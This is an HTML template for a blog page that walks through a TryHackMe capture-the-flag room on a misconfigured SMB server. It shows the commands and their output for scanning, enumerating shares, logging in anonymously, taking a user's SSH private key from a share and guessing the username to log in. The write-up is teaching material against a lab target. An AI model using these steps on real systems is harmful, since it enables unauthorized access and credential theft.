{% extends "base.html" %}{% block title %}Intro to Networking{%endblock%}
{% block content %}

<div class="container">
    <h1 id="typing-effect" class="display-2 mb-4"></h1> 
    <br />

    <div class="solution-div">

    <p>In this page I show how to solve the Exploiting SMB - Network Services room CTF on TryHackMe platform.
    </p>

    <h2>Enumeration</h2>

    <p>We are given an IP address and asked to exploit the target which has a misconfigured SMB protocol. To do so, 
        we first need to do a little recon beforehand. With a simple nmap, we can find all the open ports in the machine:
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ nmap 10.10.21.36            
            Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 22:42 -03
            Nmap scan report for 10.10.21.36
            Host is up (0.23s latency).
            Not shown: 997 closed tcp ports (conn-refused)
            PORT    STATE SERVICE
            22/tcp  open  ssh
            139/tcp open  netbios-ssn
            445/tcp open  microsoft-ds
                
            Nmap done: 1 IP address (1 host up) scanned in 33.36 seconds
            </code>
        </pre>
    </div> 

    <p>
        We can identify the SMB server to be on ports 139 and 445, based on the service shown. The next step in our enumeration process is to 
        use Enum4linux, a tool that let us enumerate SMB servers for Linux and Windows. This has a huge stdout, so I'm just going to show 
        the more interesting parts of the results. To run this enumeration, we run:
    </p>

    <p>
        <code class="hljs language-python"><span class="hljs-keyword">enum4linux &lt;target-ip&gt;</span></code>
    </p>
    <p>
        Of course, you should change the IP address to the machine spawned in your platform. 
    </p>



    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            ==================================( Share Enumeration on 10.10.21.36 )==================================


                Sharename       Type      Comment
                ---------       ----      -------
                netlogon        Disk      Network Logon Service
                profiles        Disk      Users profiles
                print$          Disk      Printer Drivers
                IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
            Reconnecting with SMB1 for workgroup listing.
            
                Server               Comment
                ---------            -------
            
                Workgroup            Master
                ---------            -------
                WORKGROUP            POLOSMB
            </code>
        </pre>
    </div> 

    <p>Note that we have successfully found some shares in this SMB server. Look that there is a share called profiles, which might contain 
        the Users profiles of this server.
    </p>

    <p>Let's write down what we have found so far:</p>

    <ul class="custom-bullet-list">
        <li><b>SMB Shares:</b> We found a share that might contain user profiles. In it, we might find interesting information.</li>
        <li><b>Workgroup:</b> We also have found the workgroup name, which is WORKGROUP.</li>
    </ul>

    <h2>Exploitation</h2>

    <p>
        The first approach here is to try to connect to this share using smbclient tool. This tool lets us connect to SMB servers remotely. 
        However, we might not be able to do so without any credentials, but sometimes we can successfully login as anonymous users (similar to FTP).
        Let's try the following:
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ smbclient //10.10.21.36/profiles -U anonymous -p 445
            Password for [WORKGROUP\anonymous]:
            Try "help" to get a list of possible commands.
            smb: \>     
            </code>
        </pre>
    </div>   


    <p>Look that we have successfully logged in as anonymous, which might help us retrieve sensitive information in this server share.
        Let's run the ls command to list the files in this share.
    </p>


    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            smb: \> ls
            .                                   D        0  Tue Apr 21 08:08:23 2020
            ..                                  D        0  Tue Apr 21 07:49:56 2020
            .cache                             DH        0  Tue Apr 21 08:08:23 2020
            .profile                            H      807  Tue Apr 21 08:08:23 2020
            .sudo_as_admin_successful           H        0  Tue Apr 21 08:08:23 2020
            .bash_logout                        H      220  Tue Apr 21 08:08:23 2020
            .viminfo                            H      947  Tue Apr 21 08:08:23 2020
            Working From Home Information.txt      N      358  Tue Apr 21 08:08:23 2020
            .ssh                               DH        0  Tue Apr 21 08:08:23 2020
            .bashrc                             H     3771  Tue Apr 21 08:08:23 2020
            .gnupg                             DH        0  Tue Apr 21 08:08:23 2020
              
                  12316808 blocks of size 1024. 7567056 blocks available
            smb: \> 
              
            </code>
        </pre>
    </div>

    <p>
        Note that there is a .txt file called "Working From Home Information.txt". It might contain interesting information. Let's download it 
        using the get command: <code class="hljs language-python"><span class="hljs-keyword">get "Working From Home Information.txt"</span></code>.
        After downloading it, we can cat it in our local machine to see its contents.
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ cat Working\ From\ Home\ Information.txt 
            John Cactus,
                
            As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever 
            possible, employees should work from home. As such- your account has now been enabled with ssh
            access to the main server.
                
            If there are any problems, please contact the IT department at it@polointernalcoms.uk
                
            Regards,
                
            James
            Department Manager                 
            </code>
        </pre>
    </div>

    <p>Great! We have found some interesting information here. The first one is that an ssh access was granted to John Cactus because it was 
        working from home. The other information, well, it's the name John Cactus, which might have an username like john, johncactus or cactus.
        And even though we do not have his passowrd, an ssh access was granted inside the share, so it might be worth looking the SMB server again.
    </p>

    <p>Let's connect to the SMB server again as anonymous. Remember that there was a directory there called .ssh. It might be a good idea looking inside 
        it.
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            smb: \> cd .ssh\
            smb: \.ssh\> ls
              .                                   D        0  Tue Apr 21 08:08:23 2020
              ..                                  D        0  Tue Apr 21 08:08:23 2020
              id_rsa                              A     1679  Tue Apr 21 08:08:23 2020
              id_rsa.pub                          N      396  Tue Apr 21 08:08:23 2020
              authorized_keys                     N        0  Tue Apr 21 08:08:23 2020
                
                    12316808 blocks of size 1024. 7567056 blocks available
            smb: \.ssh\> 
                              
            </code>
        </pre>
    </div>

    <p>Look that we have a file id_rsa, which seems to be the rsa key granting access to John Cactus to the server via ssh. Let's get it using the get 
        command. This should download it to our local machine.
    </p>

    <p>In our local machine, let's try to ssh to the server now. The syntax to connect using a rsa id key is:</p>

    <p><code class="hljs language-python"><span class="hljs-keyword">ssh -i /path/to/id_rsa username@ip-address</span></code></p>

    <p>This is the part where we need to guess the user's username. Since his name is John Cactus, I've tried john, johncactus, jcactus and cactus.
        After these attempts, cactus proved to be the correct username, granting ssh access to the server!
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ ssh -i id_rsa cactus@10.10.21.36                    
            Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)
                
             * Documentation:  https://help.ubuntu.com
             * Management:     https://landscape.canonical.com
             * Support:        https://ubuntu.com/advantage
                
              System information as of Wed Aug 23 02:07:18 UTC 2023
            
              System load:  0.0                Processes:           92
              Usage of /:   33.3% of 11.75GB   Users logged in:     0
              Memory usage: 17%                IP address for eth0: 10.10.21.36
              Swap usage:   0%
                
                
            22 packages can be updated.
            0 updates are security updates.
                
            Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
                
                
            Last login: Wed Aug 23 01:27:40 2023 from 10.18.5.100
            cactus@polosmb:~$ whoami      
            cactus
            cactus@polosmb:~$                
            </code>
        </pre>
    </div>

    <p>If we run the ls command here, we find the smb.txt file, containing the flag!</p>
    <a href="/ctfs">Go back</a>
    </div>

</div>


{% endblock %}